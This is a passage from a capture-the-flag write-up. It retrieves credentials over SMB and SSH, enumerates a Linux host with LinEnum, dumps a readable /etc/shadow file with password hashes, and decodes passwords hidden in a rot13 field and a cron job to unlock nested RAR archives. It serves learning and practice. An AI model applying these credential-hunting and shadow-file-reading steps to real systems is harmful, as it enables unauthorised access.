smb: \> get credenitals.txt
getting file \credenitals.txt of size 38 as credenitals.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
We got another pair of credentials:
```console
root@kali:/media/sf_CTFs/hoshen/1# cat credenitals.txt
username: cuser
password: Sec0ndPh@se
```
## SSH: 104.43.243.221
Using the credentials we just found, let's SSH into the machine:
```console
root@kali:/media/sf_CTFs/hoshen/1# sshpass -p Sec0ndPh@se ssh PI:EMAIL
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.0.0-1027-azure x86_64)
Last login: Sat Feb  8 22:20:49 2020 from 84.108.30.242
cuser@HoshenCtf2:~$
```
We find here another (encrypted) RAR archive:
```console
cuser@HoshenCtf2:~$ find / -type f -name "*.rar" 2>/dev/null
/var/local/decrypt.rar.rar
cuser@HoshenCtf2:~$ cd /var/local/
cuser@HoshenCtf2:/var/local$ ls -al
total 16
drwxrwsr-x  3 root staff 4096 Jan 20 17:50 .
drwxr-xr-x 13 root root  4096 Dec 18 19:14 ..
drwxr-sr-x  2 root staff 4096 Jan 19 09:12 Creds
-rwxr-xr-x  1 root root   947 Jan 20 15:43 decrypt.rar.rar
cuser@HoshenCtf2:/var/local$ cd Creds/
cuser@HoshenCtf2:/var/local/Creds$ ls
credenitals.txt
cuser@HoshenCtf2:/var/local/Creds$ cat credenitals.txt
username: cuser
password: Sec0ndPh@se
```
We need to find the password somewhere in the system. It's time to perform system enumeration. A script such as [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) can help us.
After running the script, the first result that should stand out is the fact that we can read `/etc/shadow`:
```
[+] We can read the shadow file!
root:$6$eTbDRaoQ$f1aycF/9chbCHeIwkwR20QbaVvjxyhFZQr9kNDUb.EB85SbSr8l07nXzq0R7BmjSY.xsPRSQVFt.BaDmI9eFH/:18298:0:99999:7:::
daemon:*:18248:0:99999:7:::
bin:*:18248:0:99999:7:::
sys:*:18248:0:99999:7:::
sync:*:18248:0:99999:7:::
games:*:18248:0:99999:7:::
man:*:18248:0:99999:7:::
lp:*:18248:0:99999:7:::
mail:*:18248:0:99999:7:::
news:*:18248:0:99999:7:::
uucp:*:18248:0:99999:7:::
proxy:*:18248:0:99999:7:::
www-data:*:18248:0:99999:7:::
backup:*:18248:0:99999:7:::
list:*:18248:0:99999:7:::
irc:*:18248:0:99999:7:::
gnats:*:18248:0:99999:7:::
nobody:*:18248:0:99999:7:::
systemd-network:*:18248:0:99999:7:::
systemd-resolve:*:18248:0:99999:7:::
syslog:*:18248:0:99999:7:::
messagebus:*:18248:0:99999:7:::
_apt:*:18248:0:99999:7:::
lxd:*:18248:0:99999:7:::
uuidd:*:18248:0:99999:7:::
dnsmasq:*:18248:0:99999:7:::
landscape:*:18248:0:99999:7:::
sshd:*:18248:0:99999:7:::
pollinate:*:18248:0:99999:7:::
hoshenCtf:$6$sg124Ebw$EKdW5ZRvnCc2bFLDhw5UkOVNzfsEkzHwN2nJuZLHNRUSeazTlK7tUaphC7aVCfaGjml2lv4vFX6wThwiyLowt0:18298:0:99999:7:::
sambauser:$6$f11iy2W/$webTCIycnufq9zGSieShko/XWDGMNXYUjqupyIItkd99fIGOzfFhx48qh.OPVTr.8HjO3N5iBNMAqHg67Uxi20:18276:0:99999:7:::
MrPink:$6$w/C7AYid$W9ioXMiz3PoB4BL8Xv3rX085Og0aM1YfOrl2gg8yfNrAsGSF6bWdLP8RI//MNz72V95cueGxMzq4AjBts.1RL1:18276:0:99999:7:::
cuser:$6$hWYEC0gP$fyuO7h6Q/rqtN7NMZ/2uyLp30semAdr6w3/vkyYOO06QJ33eRVe3h8SpaG0YIGg2KyCFg6K0O/YX1F1.QS0v11:18298:0:99999:7:::
pass1:O@O@O@L3E:18280:0:99999:7::0:
```
In theory we can try using the passowrd hashes to recover the passwords. However, this might take a while, especially since the hash algorithm used is `sha512` (based on the `$6` prefix).
Notice how the "Encrypted Password" field for `pass1` doesn't comply with the [standard shadow format](https://linux.die.net/man/5/shadow). Instead, it contains `O@O@O@L3E` which is illegal for this field.
This starts to make sense when combined with the group membership output:
```
[-] Group memberships:
...
uid=1004(pass1) gid=1004(rot13) groups=1004(rot13)
```
The group is `rot13` which means that we need to perform:
```console
root@kali:/media/sf_CTFs/hoshen/1# python3 -c "import codecs; print(codecs.encode('O@O@O@L3E', 'rot_13'));"
B@B@B@Y3R
```
Let's use this password to extract the archive:
```console
root@kali:/media/sf_CTFs/hoshen/1# unrar x -pB@B@B@Y3R decrypt.rar.rar
UNRAR 5.50 freeware      Copyright (c) 1993-2017 Alexander Roshal
Extracting from decrypt.rar.rar
Creating    decrypt.rar                                               OK
Extracting  decrypt.rar/decrypt.rar                                   OK
All OK
```
We receive another encrypted RAR file:
```console
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# ls
decrypt.rar
```
It's password is hidden in another section of the enumeration report:
```
[-] Jobs held by all users:
0 0 1 1 * echo 'pass2: ShP1GGy'
```
This is the cron job (also accessible via `crontab -l`). Let's use it:
```console
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# unrar x -pShP1GGy decrypt.rar
UNRAR 5.50 freeware      Copyright (c) 1993-2017 Alexander Roshal
Extracting from decrypt.rar
Extracting  decrypt.py                                                OK
All OK
```
We got a decryption script:
```python
# Elian's decryptor python 2
#import
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
# constants
# AES 256 encryption/decryption using pycrypto library
BLOCK_SIZE = 16
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
def decrypt(enc, password):
    private_key = hashlib.sha256(password.encode("utf-8")).digest()
    enc = base64.b64decode(enc)
    iv = enc[:16]
    cipher = AES.new(private_key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc[16:]))
# Let us decrypt using our original password
#decrypted = decrypt(encrypted, password)
#print(bytes.decode(decrypted))
def main():
    password = raw_input("Enter encryption password: ")
    path = raw_input("Enter the path to the file you want to decrypt: ")
    # read file content
    with open(path, 'rb') as filee:
        content = filee.read()
    decreypted = decrypt(content, password)
    # write new to file
    with open(path, 'wb') as filee:
        filee.write(decreypted)
    print("your file is decrypted")
if __name__ == "__main__":
    main()
```
Let's use it to decrypt the classified document:
```console
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# cp ../classified_document.txt .
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# echo SzBsSGFLM2Y= | base64 -d
K0lHaK3f
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# python decrypt.py
Enter encryption password: K0lHaK3f
Enter the path to the file you want to decrypt: classified_document.txt
your file is decrypted
root@kali:/media/sf_CTFs/hoshen/1/decrypt.rar# cat classified_document.txt
Th3Dr3aMt3aM
```
We can finally use this password to decrypt the PCAP file:
```console
root@kali:/media/sf_CTFs/hoshen/1# unrar x -pTh3Dr3aMt3aM Challenge2.pcap.rar
UNRAR 5.50 freeware      Copyright (c) 1993-2017 Alexander Roshal
Extracting from Challenge2.pcap.rar
Extracting  Challenge2.pcapng                                         OK
All OK
```
Note: At some stage, the challenge owners updated the RAR file and added a README:
```
After opening challenge2.pcap.rar, please send to our mail the md5 of the pcap as a flag.
The pcap contains evidence of an attack in a private network we were hired to research.
You should find the outer IP address of the attacker by investigating malicious activity.
This challeng will require you to think out of the box, good luck.
```